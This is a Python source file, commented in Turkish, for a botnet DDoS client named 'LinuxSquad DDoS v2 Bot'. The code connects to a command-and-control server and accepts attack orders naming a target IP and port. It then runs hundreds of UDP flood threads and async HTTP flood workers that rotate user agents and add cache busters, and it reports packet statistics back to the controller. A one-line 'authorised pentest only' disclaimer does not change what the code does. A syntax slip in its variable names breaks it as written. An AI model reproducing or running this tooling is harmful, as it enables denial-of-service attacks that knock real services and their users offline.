#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bot: KALKAN - LinuxSquad DDoS v2 Bot
# Yalnızca izinli pentest ortamında kullanınız.

import sys
import socket
import threading
import random
import time
import asyncio
import os
import json

# ==================== KONFİGÜRASYON ====================
BOT_ADI = "Mızrak"
C&C_IP = ""  # C&C sunucu IP'sini buraya yaz
C&C_PORT = 9002  # Kalkan için: 9001

# ==================== BANNER ====================
os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════╗")
print("║              LINUXSQUAD BOT v2 - TERMUX OPTIMIZED                ║")
print(f"║                    Bot Adı: {BOT_ADI:^30s}             ║")
print("║              Yalnızca izinli pentest ortamında                   ║")
print("╚══════════════════════════════════════════════════════════════════╝")
print("\033[0m")

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_ENABLED = True
except ImportError:
    UVLOOP_ENABLED = False

try:
    import aiohttp
    AIOHTTP_ENABLED = True
except ImportError:
    AIOHTTP_ENABLED = False
    print("\033[91m[!] aiohttp yok, sadece UDP modu çalışır. 'pip install aiohttp' önerilir.\033[0m")

# ==================== İSTATİSTİK ====================
stats = {
    "udp_packets": 0, "udp_bytes": 0, "http_requests": 0, 
    "errors": 0, "start_time": time.time()
}
stats_lock = threading.Lock()
saldiri_aktif = threading.Event()
saldiri_aktif.clear()

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

def get_stats():
    with stats_lock:
        return dict(stats)

# ==================== C&C BAĞLANTISI ====================
def cc_baglan():
    """C&C sunucusuna bağlanır ve komutları dinler"""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(None)
            sock.connect((C&C_IP, C&C_PORT))
            
            # Heartbeat gönder
            heartbeat = json.dumps({"status": "alive", "bot": BOT_ADI}) + "\n"
            sock.send(heartbeat.encode())
            
            print(f"\033[92m[✓] C&C sunucusuna bağlanıldı ({C&C_IP}:{C&C_PORT})\033[0m")
            
            buffer = ""
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                buffer += data.decode()
                
                while "\n" in buffer:
                    komut_str, buffer = buffer.split("\n", 1)
                    try:
                        komut = json.loads(komut_str)
                        komut_isle(komut)
                    except:
                        pass
        except:
            print(f"\033[93m[!] C&C bağlantısı başarısız, 5sn sonra tekrar...\033[0m")
            time.sleep(5)

# ==================== KOMUT İŞLEME ==================== 
def komut_isle(komut):
    """C&C'den gelen komutları işler"""
    global hedef_ip, hedef_port, metod, concurrency, saldiri_suresi
    
    if komut.get("komut") == "saldir":
        hedef_ip = komut["hedef_ip"]
        hedef_port = komut["hedef_port"]
        metod = komut.get("metod", "mixed")
        concurrency = komut.get("concurrency", 800)
        saldiri_suresi = komut.get("sure", 0)
        
        print(f"\n\033[92m[+] SALDIRI EMRİ ALINDI → {hedef_ip}:{hedef_port} | Metod: {metod.upper()}\033[0m")
        
        # İstatistikleri sıfırla
        with stats_lock:
            stats["udp_packets"] = 0
            stats["udp_bytes"] = 0
            stats["http_requests"] = 0
            stats["errors"] = 0
            stats["start_time"] = time.time()
        
        saldiri_aktif.set()
        
        # Saldırıyı başlat
        saldiri_thread = threading.Thread(target=saldiri_baslat, daemon=True)
        saldiri_thread.start()
        
    elif komut.get("komut") == "durdur":
        print(f"\033[91m[■] DURDURMA EMRİ ALINDI\033[0m")
        saldiri_aktif.clear()

# ==================== SALDIRI MOTORU ====================
hedef_ip = ""
hedef_port = 0
metod = "mixed"
concurrency = 800
saldiri_suresi = 0

# ---- UDP FLOOD ----
def udp_flood_worker():
    """UDP flood worker thread"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32 * 1024 * 1024)
    except:
        return
    
    while saldiri_aktif.is_set():
        try:
            tport = hedef_port if random.random() > 0.25 else random.randint(1, 65535)
            size = random.randint(4096, 16384)
            payload = random.randbytes(size)
            sock.sendto(payload, (hedef_ip, tport))
            update_stats(udp_pkt=1, udp_bytes=size)
        except:
            update_stats(err=1)

# ---- HTTP FLOOD ----
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15",
]
PATHS = ["/", "/index", "/home", "/search", "/api", "/login"]

async def http_flood_worker(session):
    """HTTP flood async worker"""
    while saldiri_aktif.is_set():
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Accept": "*/*",
            }
            cache_buster = f"?t={int(time.time()*1000000)}"
            path = random.choice(PATHS) + cache_buster
            url = f"http://{hedef_ip}:{hedef_port}{path}"
            
            async with session.get(url, headers=headers, timeout=5) as response:
                await response.read()
            update_stats(http_req=1)
        except:
            update_stats(err=1)

# ---- SALDIRI BAŞLAT ----
def saldiri_baslat():
    """Ana saldırı fonksiyonu"""
    
    # UDP Flood Thread'leri
    if metod in ["udp", "mixed"]:
        udp_count = int(concurrency * 0.7) if metod == "mixed" else concurrency
        udp_count = min(udp_count, 500)  # Termux stabilitesi için sınır
        print(f"\033[92m[+] {udp_count} UDP Worker başlatılıyor...\033[0m")
        for _ in range(udp_count):
            t = threading.Thread(target=udp_flood_worker, daemon=True)
            t.start()
    
    # HTTP Flood Async
    if AIOHTTP_ENABLED and metod in ["http", "mixed"]:
        http_count = int(concurrency * 0.3) if metod == "mixed" else max(50, concurrency//2)
        http_count = min(http_count, 200)
        print(f"\033[92m[+] {http_count} HTTP Worker başlatılıyor...\033[0m")
        
        async def run_http():
            connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=True)
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = [asyncio.create_task(http_flood_worker(session)) for _ in range(http_count)]
                durdur_async = asyncio.create_task(bekle_ve_durdur())
                await asyncio.gather(*tasks, durdur_async, return_exceptions=True)
        
        asyncio.run(run_http())
    
    else:
        # Sadece UDP modu - süre kontrolü
        try:
            if saldiri_suresi > 0:
                time.sleep(saldiri_suresi)
                saldiri_aktif.clear()
            else:
                while saldiri_aktif.is_set():
                    time.sleep(1)
        except:
            pass

async def bekle_ve_durdur():
    """Asenkron süre bekleyicisi"""
    if saldiri_suresi > 0:
        await asyncio.sleep(saldiri_suresi)
        saldiri_aktif.clear()
    else:
        while saldiri_aktif.is_set():
            await asyncio.sleep(1)

# ==================== İSTATİSTİK RAPORLA ====================
def istatistik_gonder():
    """Her 2 saniyede bir C&C'ye istatistik gönderir"""
    while True:
        time.sleep(2)
        if saldiri_aktif.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((C&C_IP, C&C_PORT))
                rapor = json.dumps({
                    "bot": BOT_ADI,
                    "stats": get_stats(),
                    "baslangic": stats["start_time"]
                }) + "\n"
                sock.send(rapor.encode())
                sock.close()
            except:
                pass

# ==================== ANA ====================
if __name__ == "__main__":
    if not C&C_IP:
        C&C_IP = input("C&C Sunucu IP: ").strip()
    
    print(f"\033[92m[+] Bot: {BOT_ADI} | C&C: {C&C_IP}:{C&C_PORT}\033[0m")
    
    # İstatistik gönderme thread'i
    t = threading.Thread(target=istatistik_gonder, daemon=True)
    t.start()
    
    # C&C'ye bağlan
    try:
        cc_baglan()
    except KeyboardInterrupt:
        print(f"\n\033[91m[-] {BOT_ADI} kapatılıyor...\033[0m")
